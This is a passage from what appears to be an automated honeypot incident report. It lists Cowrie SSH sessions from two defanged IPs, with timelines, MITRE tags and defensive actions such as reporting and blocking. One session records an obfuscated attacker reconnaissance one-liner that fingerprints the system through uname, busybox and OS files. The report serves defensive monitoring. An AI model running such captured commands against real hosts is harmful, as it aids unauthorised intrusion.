| `2026-08-15 20:17:05` | `cowrie.command.input` |
| `2026-08-15 20:17:05` | `cowrie.command.input` |
| `2026-08-15 20:17:05` | `cowrie.command.input` |
| `2026-08-15 20:17:05` | `cowrie.command.input` |
| `2026-08-15 20:17:05` | `cowrie.command.success` |
| `2026-08-15 20:17:05` | `cowrie.command.input` |
| `2026-08-15 20:17:05` | `cowrie.command.input` |
| `2026-08-15 20:17:05` | `cowrie.command.input` |
| `2026-08-15 20:17:05` | `cowrie.command.input` |
| `2026-08-15 20:17:05` | `cowrie.log.closed` |
| `2026-08-15 20:17:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f87788fc203

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:17 |
| **Last Seen** | 2026-08-15 20:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:17:02` | `cowrie.session.connect` |
| `2026-08-15 20:17:02` | `cowrie.client.version` |
| `2026-08-15 20:17:02` | `cowrie.client.kex` |
| `2026-08-15 20:17:02` | `cowrie.login.success` |
| `2026-08-15 20:17:04` | `cowrie.session.params` |
| `2026-08-15 20:17:04` | `cowrie.command.input` |
| `2026-08-15 20:17:04` | `cowrie.log.closed` |
| `2026-08-15 20:17:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5bc876813ed

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:17 |
| **Last Seen** | 2026-08-15 20:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:17:07` | `cowrie.session.connect` |
| `2026-08-15 20:17:07` | `cowrie.client.version` |
| `2026-08-15 20:17:07` | `cowrie.client.kex` |
| `2026-08-15 20:17:07` | `cowrie.login.success` |
| `2026-08-15 20:17:08` | `cowrie.session.params` |
| `2026-08-15 20:17:08` | `cowrie.command.input` |
| `2026-08-15 20:17:08` | `cowrie.log.closed` |
| `2026-08-15 20:17:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b385ecf823af

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:17 |
| **Last Seen** | 2026-08-15 20:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:17:12` | `cowrie.session.connect` |
| `2026-08-15 20:17:12` | `cowrie.client.version` |
| `2026-08-15 20:17:12` | `cowrie.client.kex` |
| `2026-08-15 20:17:13` | `cowrie.login.success` |
| `2026-08-15 20:17:14` | `cowrie.session.params` |
| `2026-08-15 20:17:14` | `cowrie.command.input` |
| `2026-08-15 20:17:14` | `cowrie.log.closed` |
| `2026-08-15 20:17:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41ec960b13d4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:17 |
| **Last Seen** | 2026-08-15 20:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:17:17` | `cowrie.session.connect` |
| `2026-08-15 20:17:18` | `cowrie.client.version` |
| `2026-08-15 20:17:18` | `cowrie.client.kex` |
| `2026-08-15 20:17:18` | `cowrie.login.success` |
| `2026-08-15 20:17:19` | `cowrie.session.params` |
| `2026-08-15 20:17:19` | `cowrie.command.input` |
| `2026-08-15 20:17:19` | `cowrie.log.closed` |
| `2026-08-15 20:17:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a41f049dc943

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:17 |
| **Last Seen** | 2026-08-15 20:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:17:23` | `cowrie.session.connect` |
| `2026-08-15 20:17:23` | `cowrie.client.version` |
| `2026-08-15 20:17:23` | `cowrie.client.kex` |
| `2026-08-15 20:17:23` | `cowrie.login.success` |
| `2026-08-15 20:17:24` | `cowrie.session.params` |
| `2026-08-15 20:17:24` | `cowrie.command.input` |
| `2026-08-15 20:17:25` | `cowrie.log.closed` |
| `2026-08-15 20:17:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8327473a29f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:17 |
| **Last Seen** | 2026-08-15 20:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:17:28` | `cowrie.session.connect` |
| `2026-08-15 20:17:28` | `cowrie.client.version` |
| `2026-08-15 20:17:28` | `cowrie.client.kex` |
| `2026-08-15 20:17:28` | `cowrie.login.success` |
| `2026-08-15 20:17:29` | `cowrie.session.params` |
| `2026-08-15 20:17:29` | `cowrie.command.input` |
| `2026-08-15 20:17:29` | `cowrie.log.closed` |
| `2026-08-15 20:17:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0393f86eea0f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:17 |
| **Last Seen** | 2026-08-15 20:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:17:33` | `cowrie.session.connect` |
| `2026-08-15 20:17:33` | `cowrie.client.version` |
| `2026-08-15 20:17:33` | `cowrie.client.kex` |
| `2026-08-15 20:17:33` | `cowrie.login.success` |
| `2026-08-15 20:17:34` | `cowrie.session.params` |
| `2026-08-15 20:17:34` | `cowrie.command.input` |
| `2026-08-15 20:17:34` | `cowrie.log.closed` |
| `2026-08-15 20:17:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66e78eeeead6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:17 |
| **Last Seen** | 2026-08-15 20:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:17:38` | `cowrie.session.connect` |
| `2026-08-15 20:17:38` | `cowrie.client.version` |
| `2026-08-15 20:17:38` | `cowrie.client.kex` |
| `2026-08-15 20:17:38` | `cowrie.login.success` |
| `2026-08-15 20:17:39` | `cowrie.session.params` |
| `2026-08-15 20:17:39` | `cowrie.command.input` |
| `2026-08-15 20:17:39` | `cowrie.log.closed` |
| `2026-08-15 20:17:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ed91b4ddefb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:17 |
| **Last Seen** | 2026-08-15 20:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:17:43` | `cowrie.session.connect` |
| `2026-08-15 20:17:43` | `cowrie.client.version` |
| `2026-08-15 20:17:43` | `cowrie.client.kex` |
| `2026-08-15 20:17:43` | `cowrie.login.success` |
| `2026-08-15 20:17:44` | `cowrie.session.params` |
| `2026-08-15 20:17:44` | `cowrie.command.input` |
| `2026-08-15 20:17:45` | `cowrie.log.closed` |
| `2026-08-15 20:17:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a45807844377

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:17 |
| **Last Seen** | 2026-08-15 20:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:17:48` | `cowrie.session.connect` |
| `2026-08-15 20:17:48` | `cowrie.client.version` |
| `2026-08-15 20:17:48` | `cowrie.client.kex` |
| `2026-08-15 20:17:48` | `cowrie.login.success` |
| `2026-08-15 20:17:50` | `cowrie.session.params` |
| `2026-08-15 20:17:50` | `cowrie.command.input` |
| `2026-08-15 20:17:50` | `cowrie.log.closed` |
| `2026-08-15 20:17:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99a432533e97

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:17 |
| **Last Seen** | 2026-08-15 20:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:17:53` | `cowrie.session.connect` |
| `2026-08-15 20:17:53` | `cowrie.client.version` |
| `2026-08-15 20:17:53` | `cowrie.client.kex` |
| `2026-08-15 20:17:54` | `cowrie.login.success` |
| `2026-08-15 20:17:55` | `cowrie.session.params` |
| `2026-08-15 20:17:55` | `cowrie.command.input` |
| `2026-08-15 20:17:55` | `cowrie.log.closed` |
| `2026-08-15 20:17:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b50223a888de

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:17 |
| **Last Seen** | 2026-08-15 20:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:17:59` | `cowrie.session.connect` |
| `2026-08-15 20:17:59` | `cowrie.client.version` |
| `2026-08-15 20:17:59` | `cowrie.client.kex` |
| `2026-08-15 20:17:59` | `cowrie.login.success` |
| `2026-08-15 20:18:00` | `cowrie.session.params` |
| `2026-08-15 20:18:00` | `cowrie.command.input` |
| `2026-08-15 20:18:00` | `cowrie.log.closed` |
| `2026-08-15 20:18:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-270d50dcabd6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:18 |
| **Last Seen** | 2026-08-15 20:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:18:04` | `cowrie.session.connect` |
| `2026-08-15 20:18:04` | `cowrie.client.version` |
| `2026-08-15 20:18:04` | `cowrie.client.kex` |
| `2026-08-15 20:18:04` | `cowrie.login.success` |
| `2026-08-15 20:18:05` | `cowrie.session.params` |
| `2026-08-15 20:18:05` | `cowrie.command.input` |
| `2026-08-15 20:18:06` | `cowrie.log.closed` |
| `2026-08-15 20:18:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19205f9484ab

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:18 |
| **Last Seen** | 2026-08-15 20:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:18:09` | `cowrie.session.connect` |
| `2026-08-15 20:18:09` | `cowrie.client.version` |
| `2026-08-15 20:18:09` | `cowrie.client.kex` |
| `2026-08-15 20:18:09` | `cowrie.login.success` |
| `2026-08-15 20:18:10` | `cowrie.session.params` |
| `2026-08-15 20:18:10` | `cowrie.command.input` |
| `2026-08-15 20:18:10` | `cowrie.log.closed` |
| `2026-08-15 20:18:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08413448da9c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:18 |
| **Last Seen** | 2026-08-15 20:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:18:14` | `cowrie.session.connect` |
| `2026-08-15 20:18:14` | `cowrie.client.version` |
| `2026-08-15 20:18:14` | `cowrie.client.kex` |
| `2026-08-15 20:18:14` | `cowrie.login.success` |
| `2026-08-15 20:18:15` | `cowrie.session.params` |
| `2026-08-15 20:18:15` | `cowrie.command.input` |
| `2026-08-15 20:18:15` | `cowrie.log.closed` |
| `2026-08-15 20:18:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db6ebef5e563

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:18 |
| **Last Seen** | 2026-08-15 20:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:18:19` | `cowrie.session.connect` |
| `2026-08-15 20:18:19` | `cowrie.client.version` |
| `2026-08-15 20:18:19` | `cowrie.client.kex` |
| `2026-08-15 20:18:20` | `cowrie.login.success` |
| `2026-08-15 20:18:21` | `cowrie.session.params` |
| `2026-08-15 20:18:21` | `cowrie.command.input` |
| `2026-08-15 20:18:21` | `cowrie.log.closed` |
| `2026-08-15 20:18:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50e24162ea78

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:18 |
| **Last Seen** | 2026-08-15 20:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:18:24` | `cowrie.session.connect` |
| `2026-08-15 20:18:24` | `cowrie.client.version` |
| `2026-08-15 20:18:24` | `cowrie.client.kex` |
| `2026-08-15 20:18:25` | `cowrie.login.success` |
| `2026-08-15 20:18:26` | `cowrie.session.params` |
| `2026-08-15 20:18:26` | `cowrie.command.input` |
| `2026-08-15 20:18:26` | `cowrie.log.closed` |
| `2026-08-15 20:18:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37bd37dbd43e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:18 |
| **Last Seen** | 2026-08-15 20:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:18:29` | `cowrie.session.connect` |
| `2026-08-15 20:18:29` | `cowrie.client.version` |
| `2026-08-15 20:18:29` | `cowrie.client.kex` |
| `2026-08-15 20:18:30` | `cowrie.login.success` |
| `2026-08-15 20:18:31` | `cowrie.session.params` |
| `2026-08-15 20:18:31` | `cowrie.command.input` |
| `2026-08-15 20:18:31` | `cowrie.log.closed` |
| `2026-08-15 20:18:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-966f7418231a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:18 |
| **Last Seen** | 2026-08-15 20:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:18:34` | `cowrie.session.connect` |
| `2026-08-15 20:18:34` | `cowrie.client.version` |
| `2026-08-15 20:18:34` | `cowrie.client.kex` |
| `2026-08-15 20:18:35` | `cowrie.login.success` |
| `2026-08-15 20:18:36` | `cowrie.session.params` |
| `2026-08-15 20:18:36` | `cowrie.command.input` |
| `2026-08-15 20:18:36` | `cowrie.log.closed` |
| `2026-08-15 20:18:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92e776ccfb56

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:18 |
| **Last Seen** | 2026-08-15 20:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:18:40` | `cowrie.session.connect` |
| `2026-08-15 20:18:40` | `cowrie.client.version` |
| `2026-08-15 20:18:40` | `cowrie.client.kex` |
| `2026-08-15 20:18:40` | `cowrie.login.success` |
| `2026-08-15 20:18:41` | `cowrie.session.params` |
| `2026-08-15 20:18:41` | `cowrie.command.input` |
| `2026-08-15 20:18:41` | `cowrie.log.closed` |
| `2026-08-15 20:18:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfa1e99af19d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:18 |
| **Last Seen** | 2026-08-15 20:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:18:45` | `cowrie.session.connect` |
| `2026-08-15 20:18:45` | `cowrie.client.version` |
| `2026-08-15 20:18:45` | `cowrie.client.kex` |
| `2026-08-15 20:18:45` | `cowrie.login.success` |
| `2026-08-15 20:18:46` | `cowrie.session.params` |
| `2026-08-15 20:18:46` | `cowrie.command.input` |
| `2026-08-15 20:18:47` | `cowrie.log.closed` |
| `2026-08-15 20:18:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92e346ad0ecf

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 20:18 |
| **Last Seen** | 2026-08-15 20:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:18:48` | `cowrie.session.connect` |
| `2026-08-15 20:18:49` | `cowrie.client.version` |
| `2026-08-15 20:18:49` | `cowrie.client.kex` |
| `2026-08-15 20:18:53` | `cowrie.login.success` |
| `2026-08-15 20:18:55` | `cowrie.session.params` |
| `2026-08-15 20:18:55` | `cowrie.command.input` |
| `2026-08-15 20:18:55` | `cowrie.command.input` |
| `2026-08-15 20:18:55` | `cowrie.command.input` |
| `2026-08-15 20:18:55` | `cowrie.command.input` |
| `2026-08-15 20:18:55` | `cowrie.command.input` |
| `2026-08-15 20:18:55` | `cowrie.command.success` |
| `2026-08-15 20:18:55` | `cowrie.command.input` |
| `2026-08-15 20:18:55` | `cowrie.command.input` |
| `2026-08-15 20:18:55` | `cowrie.command.input` |
| `2026-08-15 20:18:55` | `cowrie.command.input` |
| `2026-08-15 20:18:56` | `cowrie.log.closed` |
| `2026-08-15 20:18:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7ab211f6961

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:18 |
| **Last Seen** | 2026-08-15 20:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:18:50` | `cowrie.session.connect` |
| `2026-08-15 20:18:50` | `cowrie.client.version` |
| `2026-08-15 20:18:50` | `cowrie.client.kex` |
| `2026-08-15 20:18:51` | `cowrie.login.success` |
| `2026-08-15 20:18:51` | `cowrie.session.params` |
| `2026-08-15 20:18:51` | `cowrie.command.input` |
| `2026-08-15 20:18:52` | `cowrie.log.closed` |
| `2026-08-15 20:18:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e43db5aefc1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:18 |
| **Last Seen** | 2026-08-15 20:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:18:56` | `cowrie.session.connect` |
| `2026-08-15 20:18:56` | `cowrie.client.version` |
| `2026-08-15 20:18:56` | `cowrie.client.kex` |
| `2026-08-15 20:18:56` | `cowrie.login.success` |
| `2026-08-15 20:18:57` | `cowrie.session.params` |
| `2026-08-15 20:18:57` | `cowrie.command.input` |
| `2026-08-15 20:18:57` | `cowrie.log.closed` |
| `2026-08-15 20:18:57` | `cowrie.session.closed` |

**Recommended Actions:**
